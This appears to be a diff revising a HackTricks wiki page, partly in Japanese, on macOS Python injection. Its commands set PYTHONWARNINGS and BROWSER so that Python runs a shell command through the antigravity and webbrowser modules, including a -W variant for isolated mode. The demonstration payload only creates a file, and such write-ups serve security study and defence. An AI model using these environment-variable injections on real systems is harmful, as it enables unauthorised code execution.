@@ -1,22 +1,21 @@
-# macOS Python Applications Injection
+# macOS Python Application Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## `PYTHONWARNINGS` と `BROWSER` env variables を介した方法
+## `PYTHONWARNINGS` と `BROWSER` 環境変数を使用する方法
 
-Python が呼び出されるたびに arbitrary code を実行するよう、両方の environment variables を変更できます。例：<sup>[[1]](#references)</sup>
+攻撃者が Python process の環境を制御できる場合、`PYTHONWARNINGS` と `BROWSER` の組み合わせにより、細工した warning option の処理中に Python が `antigravity` module を import した際、command execution を引き起こせます。この technique は、`antigravity` が Python の `webbrowser` module で URL を開く仕組みに依存しており、`webbrowser` は `BROWSER` 環境変数を利用します。<sup>[[1]](#references)</sup>
 ```bash
-# Generate example python script
+# Generate an example Python script.
 echo "print('hi')" > /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks
+# Create /tmp/hacktricks through the inherited environment.
 PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
+# With isolated mode, inject the warning rule using -W instead.
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
-## 参考資料
+## References
 
-- [1] [環境変数を使ったHacking - elttam](https://www.elttam.com/blog/env/)
-
+- [1] [環境変数を使った Hacking - elttam](https://www.elttam.com/blog/env/)
 {{#include ../../../banners/hacktricks-training.md}}
